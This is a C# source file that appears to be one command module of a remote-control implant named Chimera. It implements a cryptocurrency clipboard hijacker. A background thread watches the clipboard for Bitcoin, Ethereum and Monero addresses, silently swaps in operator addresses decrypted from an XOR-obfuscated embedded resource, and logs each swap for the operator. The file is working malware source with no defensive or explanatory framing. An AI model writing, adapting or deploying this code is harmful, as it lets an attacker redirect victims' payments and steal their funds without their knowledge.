using System;
using System.IO;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Chimera.Commands
{
    // clipper start  — begin clipboard monitoring in background thread
    // clipper stop   — stop monitoring
    // clipper status — show running state and loaded swap addresses
    public static class Clipper
    {
        // ── Regex patterns ────────────────────────────────────────────────────────
        private static readonly Regex RxBtc = new Regex(
            @"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", RegexOptions.Compiled);
        private static readonly Regex RxEth = new Regex(
            @"^0x[a-fA-F0-9]{40}$", RegexOptions.Compiled);
        private static readonly Regex RxXmr = new Regex(
            @"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", RegexOptions.Compiled);

        // ── State ─────────────────────────────────────────────────────────────────
        private static Thread  _thread   = null;
        private static bool    _running  = false;
        private static string  _addrBtc  = null;
        private static string  _addrEth  = null;
        private static string  _addrXmr  = null;
        private static int     _swapCount = 0;
        private static readonly object _lock = new object();

        // ── Entry point ───────────────────────────────────────────────────────────
        public static string Execute(string param)
        {
            string p = (param ?? "").Trim().ToLower();
            switch (p)
            {
                case "start":  return Start();
                case "stop":   return Stop();
                case "status": return Status();
                default:
                    return "[error] Usage: clipper start | stop | status";
            }
        }

        // ── Start ─────────────────────────────────────────────────────────────────
        private static string Start()
        {
            lock (_lock)
            {
                if (_running)
                    return "[-] Clipper already running.";

                // Load swap addresses from embedded resource
                string loadErr = LoadAddresses();
                if (loadErr != null) return loadErr;

                _running   = true;
                _swapCount = 0;
                _thread    = new Thread(MonitorLoop) { IsBackground = true };
                _thread.SetApartmentState(ApartmentState.STA); // Clipboard needs STA
                _thread.Start();
            }
            return "[+] Clipper started.\n" +
                   "    BTC swap: " + (_addrBtc ?? "(none)") + "\n" +
                   "    ETH swap: " + (_addrEth ?? "(none)") + "\n" +
                   "    XMR swap: " + (_addrXmr ?? "(none)");
        }

        // ── Stop ──────────────────────────────────────────────────────────────────
        private static string Stop()
        {
            lock (_lock)
            {
                if (!_running)
                    return "[-] Clipper not running.";
                _running = false;
            }
            _thread?.Join(1500);
            return "[+] Clipper stopped. Total swaps performed: " + _swapCount;
        }

        // ── Status ────────────────────────────────────────────────────────────────
        private static string Status()
        {
            bool   r = _running;
            int    s = _swapCount;
            string b = _addrBtc ?? "(not loaded)";
            string e = _addrEth ?? "(not loaded)";
            string x = _addrXmr ?? "(not loaded)";
            return string.Format(
                "Clipper status: {0}\n" +
                "  Swaps so far : {1}\n" +
                "  BTC addr     : {2}\n" +
                "  ETH addr     : {3}\n" +
                "  XMR addr     : {4}",
                r ? "RUNNING" : "STOPPED", s, b, e, x);
        }

        // ── Background monitor ────────────────────────────────────────────────────
        private static void MonitorLoop()
        {
            string lastSeen = null;

            while (true)
            {
                lock (_lock) { if (!_running) break; }

                try
                {
                    string text = Clipboard.GetText();
                    if (!string.IsNullOrEmpty(text) && text != lastSeen)
                    {
                        string swap = FindSwap(text.Trim());
                        if (swap != null)
                        {
                            Clipboard.SetText(swap);
                            lastSeen = swap;
                            Interlocked.Increment(ref _swapCount);
                            // Log to staging dir for operator review
                            try
                            {
                                string log = DateTime.UtcNow.ToString("u") +
                                             " | ORIG: " + text.Trim() +
                                             " | SWAP: " + swap + "\n";
                                File.AppendAllText(
                                    Path.Combine(Staging.Dir, "clipper.log"), log);
                            }
                            catch { }
                        }
                        else
                        {
                            lastSeen = text;
                        }
                    }
                }
                catch { /* clipboard may be locked by another process */ }

                Thread.Sleep(500);
            }
        }

        // ── Pattern matching ──────────────────────────────────────────────────────
        private static string FindSwap(string text)
        {
            if (_addrBtc != null && RxBtc.IsMatch(text)) return _addrBtc;
            if (_addrEth != null && RxEth.IsMatch(text)) return _addrEth;
            if (_addrXmr != null && RxXmr.IsMatch(text)) return _addrXmr;
            return null;
        }

        // ── Load addresses from embedded crypto_map_enc resource ──────────────────
        // Resource is XOR-encrypted (key 0x41) JSON:
        //   {"btc":"1YourBTCAddress","eth":"0xYourETHAddress","xmr":"4YourXMRAddress"}
        private static string LoadAddresses()
        {
            try
            {
                var asm    = Assembly.GetExecutingAssembly();
                var stream = asm.GetManifestResourceStream("crypto_map_enc");
                if (stream == null)
                    return "[error] Resource 'crypto_map_enc' not found. " +
                           "Bundle it with /res:crypto_map_enc,crypto_map_enc at build time.";

                byte[] enc = new byte[stream.Length];
                stream.Read(enc, 0, enc.Length);
                stream.Close();

                // XOR decrypt
                for (int i = 0; i < enc.Length; i++)
                    enc[i] ^= 0x41;

                string json = System.Text.Encoding.UTF8.GetString(enc);

                // Simple key-value extraction — no external JSON lib needed
                _addrBtc = ExtractJsonString(json, "btc");
                _addrEth = ExtractJsonString(json, "eth");
                _addrXmr = ExtractJsonString(json, "xmr");

                if (_addrBtc == null && _addrEth == null && _addrXmr == null)
                    return "[error] crypto_map_enc decoded but no btc/eth/xmr keys found. " +
                           "Check JSON format: {\"btc\":\"...\",\"eth\":\"...\",\"xmr\":\"...\"}";

                return null; // success
            }
            catch (Exception ex)
            {
                return "[error] LoadAddresses: " + ex.Message;
            }
        }

        // Minimal JSON string extractor — finds "key":"value" pairs
        private static string ExtractJsonString(string json, string key)
        {
            string search = "\"" + key + "\":\"";
            int idx = json.IndexOf(search, StringComparison.OrdinalIgnoreCase);
            if (idx == -1) return null;
            int start = idx + search.Length;
            int end   = json.IndexOf('"', start);
            if (end == -1) return null;
            string val = json.Substring(start, end - start).Trim();
            return val.Length > 0 ? val : null;
        }
    }
}
